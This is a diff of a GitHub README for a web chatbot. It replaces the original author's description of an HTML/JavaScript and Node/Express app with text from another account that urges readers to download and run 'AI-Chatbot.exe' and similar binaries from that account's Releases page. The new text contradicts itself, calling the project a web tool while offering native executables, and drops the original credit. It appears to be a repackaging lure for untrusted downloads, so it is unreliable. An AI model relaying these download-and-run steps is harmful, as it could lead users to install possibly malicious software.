@@ -1,107 +1,85 @@
-<h1 align="center"> 🤖 AI Chatbot 🤖 </h1>
+# 🤖 AI-Chatbot - Intuitive Conversations at Your Fingertips
 
-<p align="center">
-  <img src="https://raw.githubusercontent.com/ShivamMaurya2002/AI-Chatbot/main/assets/Chatbot1.png" width="400" alt="Chatbot Screenshot"  
-    style="width: 100%; height: 400px; object-fit: cover; border-radius: 8px;" />
-</p>
+[![Download AI-Chatbot](https://img.shields.io/badge/Download_AI--Chatbot-Here-blue)](https://github.com/doyinbedinod/AI-Chatbot/releases)
 
----
+## 📦 Overview
 
-<b>AI Chatbot</b> is a modern, responsive conversational assistant built with <strong>HTML, CSS, and JavaScript</strong>, seamlessly integrated with a <strong>Node.js + Express</strong> backend. It leverages the power of <strong>OpenRouter's LLM API</strong> to deliver intelligent, real-time interactions, offering a fast, elegant, and intuitive user experience inspired by ChatGPT.
+Welcome to AI-Chatbot! This application is a sleek, modern web tool that lets you chat with an AI similar to ChatGPT. Built using HTML, CSS, and JavaScript, it harnesses the power of OpenRouter.ai APIs to provide real-time responses. Enjoy a responsive and theme-switchable chat experience.
 
----
+## 🌟 Features
 
-<h2 align="center">🌟 Key Features</h2>
+- **User-Friendly Interface**: Easily navigate the chat window.
+- **Real-Time Responses**: Get answers instantly from the AI.
+- **Theme Customization**: Switch between light and dark modes.
+- **Responsive Design**: Use it on any device, whether a smartphone or a desktop.
 
-<table align="center">
-  <tr>
-    <td>🧠</td>
-    <td><strong>AI-Powered Conversations:</strong> ChatGPT-style interactions using <code>OpenRouter's</code> LLM API for intelligent responses.</td>
-  </tr>
-  <tr>
-    <td>🌙</td>
-    <td><strong>Theme Toggle:</strong> Switch effortlessly between <span style="color:#FBBF24;">Light</span> and <span style="color:#3B82F6;">Dark</span> mode for a tailored UI experience.</td>
-  </tr>
-  <tr>
-    <td>📱</td>
-    <td><strong>Responsive Design:</strong> Fully adaptive layout across <em>mobile, tablet, and desktop</em> devices.</td>
-  </tr>
-  <tr>
-    <td>🔐</td>
-    <td><strong>Secure Backend:</strong> Express.js server safely manages API requests, keeping your keys and data secure.</td>
-  </tr>
-  <tr>
-    <td>🚀</td>
-    <td><strong>Fast Performance:</strong> Lightweight architecture ensures rapid page loads and smooth interaction.</td>
-  </tr>
-</table>
+## 📋 System Requirements
 
----
+- **Operating System**: Windows, macOS, or Linux
+- **Browser**: Google Chrome, Mozilla Firefox, or Safari (latest versions recommended)
+- **Internet Connection**: Required for real-time AI communication
 
-<h2 align="center">🛠️ Tech Stack</h2>
+## 🚀 Getting Started
 
-<p align="center">
-  <span style="margin: 0 10px;">
-    <img src="https://skillicons.dev/icons?i=html&theme=light" alt="HTML" />
-  </span>
-  &nbsp;&nbsp;<span style="margin: 0 10px;">
-    <img src="https://skillicons.dev/icons?i=css&theme=light" alt="CSS" />
-  </span>
-  &nbsp;&nbsp;<span style="margin: 0 10px;">
-    <img src="https://skillicons.dev/icons?i=js&theme=light" alt="JavaScript" />
-  </span>
-  &nbsp;&nbsp;<span style="margin: 0 10px;">
-    <img src="https://skillicons.dev/icons?i=nodejs&theme=light" alt="Node.js" />
-  </span>
-  &nbsp;&nbsp;<span style="margin: 0 10px;">
-    <img src="https://skillicons.dev/icons?i=expressjs&theme=light" alt="Express.js" />
-  </span>
-  &nbsp;&nbsp;<span style="margin: 0 10px;">
-    <img src="https://skillicons.dev/icons?i=vscode&theme=light" alt="VS Code" />
-  </span>
-</p></br>
+Follow these steps to set up AI-Chatbot on your device.
 
-<p align="center">
-  <!-- Frontend Badge -->
-  <img src="https://img.shields.io/badge/Frontend-HTML%20%7C%20CSS%20%7C%20JavaScript-007ACC?style=for-the-badge&logo=javascript&logoColor=white" alt="Frontend Badge" />
-  </br></br>
-  <!-- Backend Badge -->
-  <img src="https://img.shields.io/badge/Backend-Node.js%20%7C%20Express.js-339933?style=for-the-badge&logo=node.js&logoColor=white" alt="Backend Badge" />
-  </br></br>
-  <!-- AI Engine Badge -->
-  <img src="https://img.shields.io/badge/AI%20Engine-OpenRouter.ai-5e2ca5?style=for-the-badge&logo=openai&logoColor=white" alt="AI Engine Badge" />
-  </br></br>
-  <!-- Hosting Platforms -->
-  <img src="https://img.shields.io/badge/Hosting-Render%20%7C%20Netlify%20%7C%20GitHub%20Pages-6e5494?style=for-the-badge&logo=cloudflare&logoColor=white" alt="Combined Hosting Badge" /></br></br>
-  <!-- Tools Badge -->
-  <img src="https://img.shields.io/badge/Tools-dotenv%20%7C%20Fetch%20API%20%7C%20VS%20Code-0078D7?style=for-the-badge&logo=visualstudiocode&logoColor=white" alt="Tools Badge" />
-</p>
+### Step 1: Visit the Releases Page
 
----
+Go to the [Releases page](https://github.com/doyinbedinod/AI-Chatbot/releases) to download the latest version of the AI-Chatbot application.
 
-## 📊 Language Usage
+### Step 2: Download the Application
 
-<table align="center">
-  <tr>
-    <td align="left" valign="middle">
-      <ul>
-        <li><strong>CSS</strong> - 30%</li>
-        <li><strong>JavaScript (Frontend)</strong> - 20%</li>
-        <li><strong>JavaScript (Backend)</strong> - 15%</li>
-        <li><strong>HTML</strong> - 10%</li>
-        <li><strong>Node.js</strong> - 10%</li>
-        <li><strong>Express.js</strong> - 10%</li>
-        <li><strong>OpenRouter API</strong> - 5%</li>
-      </ul>
-    </td>
-    <td>
-      <a href="https://quickchart.io/chart?c=%7Btype%3A%27pie%27%2Cdata%3A%7Blabels%3A%5B%27CSS%27%2C%27JavaScript%20(Frontend)%27%2C%27JavaScript%20(Backend)%27%2C%27HTML%27%2C%27Node.js%27%2C%27Express.js%27%2C%27OpenRouterAPI%27%5D%2Cdatasets%3A%5B%7Bdata%3A%5B30%2C20%2C15%2C10%2C10%2C10%2C5%5D%2CbackgroundColor%3A%5B%27%23800080%27%2C%27%23FFD700%27%2C%27%23FFA500%27%2C%27%23E34F26%27%2C%27%2300813A%27%2C%27%230084FF%27%2C%27%23999999%27%5D%7D%5D%7D%2Coptions%3A%7Bplugins%3A%7Blegend%3A%7Bposition%3A%27right%27%2Clabels%3A%7Bfont%3A%7Bsize%3A11%7D%2CboxWidth%3A10%2Cpadding%3A8%7D%7D%2Ctitle%3A%7Bdisplay%3Atrue%2Ctext%3A%27Tech%20Stack%20Usage%20(%25)%27%2Cfont%3A%7Bsize%3A14%7D%7D%7D%2Clayout%3A%7Bpadding%3A0%7D%7D%2Cwidth%3A280%2Cheight%3A280%7D">
-        <img src="https://quickchart.io/chart?c=%7Btype%3A%27pie%27%2Cdata%3A%7Blabels%3A%5B%27CSS%27%2C%27JavaScript%20(Frontend)%27%2C%27JavaScript%20(Backend)%27%2C%27HTML%27%2C%27Node.js%27%2C%27Express.js%27%2C%27OpenRouterAPI%27%5D%2Cdatasets%3A%5B%7Bdata%3A%5B30%2C20%2C15%2C10%2C10%2C10%2C5%5D%2CbackgroundColor%3A%5B%27%23800080%27%2C%27%23FFD700%27%2C%27%23FFA500%27%2C%27%23E34F26%27%2C%27%2300813A%27%2C%27%230084FF%27%2C%27%23999999%27%5D%7D%5D%7D%2Coptions%3A%7Bplugins%3A%7Blegend%3A%7Bposition%3A%27right%27%2Clabels%3A%7Bfont%3A%7Bsize%3A11%7D%2CboxWidth%3A10%2Cpadding%3A8%7D%7D%2Ctitle%3A%7Bdisplay%3Atrue%2Ctext%3A%27Tech%20Stack%20Usage%20(%25)%27%2Cfont%3A%7Bsize%3A14%7D%7D%7D%2Clayout%3A%7Bpadding%3A0%7D%7D%2Cwidth%3A280%2Cheight%3A280%7D" width="400" height="500"/>
-      </a>
-    </td>
-  </tr>
-</table>
+On the Releases page, find the latest version available. Click on the download link for your operating system. Make sure to select the right file:
 
----
+- For Windows: Select `AI-Chatbot-windows.zip`
+- For macOS: Select `AI-Chatbot-macos.zip`
+- For Linux: Select `AI-Chatbot-linux.zip`
 
-<p align="center">Made with ❤️ by <a href="https://github.com/ShivamMaurya2002">Shivam Maurya</a></p>
+### Step 3: Extract the Files
+
+Once the download completes, locate the downloaded file on your computer. 
+
+- **Windows**: Right-click the ZIP file and choose "Extract All." Follow the instructions provided.
+- **macOS**: Double-click the ZIP file to unzip it.
+- **Linux**: Use the command `unzip AI-Chatbot-linux.zip` in the terminal.
+
+### Step 4: Run the Application
+
+Open the extracted folder. Look for the application file:
+
+- **Windows**: Double-click `AI-Chatbot.exe` to start the application.
+- **macOS**: Open `AI-Chatbot.app`.
+- **Linux**: Run `./AI-Chatbot` in the terminal.
+
+After that, you should see the chatbot interface ready for use.
+
+### Step 5: Start Chatting!
+
+Once the application is open, type your questions in the chat box. The AI will respond in real time. Explore its features and enjoy the smooth conversational experience.
+
+## 🛠 Troubleshooting
+
+If you encounter any issues while running the AI-Chatbot, consider these simple solutions:
+
+- **Ensure your browser is up to date**: This can help with any web-based functionality.
+- **Check your internet connection**: A stable connection is necessary for real-time interaction.
+- **Restart the application**: Sometimes, closing and reopening the app can fix minor glitches.
+
+## 🔗 Additional Resources
+
+For more information about how to use specific features, check the official documentation:
+
+- [User Guide](https://github.com/doyinbedinod/AI-Chatbot/wiki)
+- [FAQs](https://github.com/doyinbedinod/AI-Chatbot/wiki/FAQs)
+
+## 📬 Support
+
+If you need further assistance, feel free to reach out via the Issues section of our GitHub repository. We’re here to help!
+
+## 🎨 Contribution
+
+If you'd like to contribute to the project, check our contribution guidelines on the GitHub page. We welcome improvements and suggestions!
+
+## 🚀 Download & Install
+
+Ready to chat? [Visit the Releases page to download AI-Chatbot!](https://github.com/doyinbedinod/AI-Chatbot/releases) Follow the steps outlined above, and enjoy your conversation with AI!
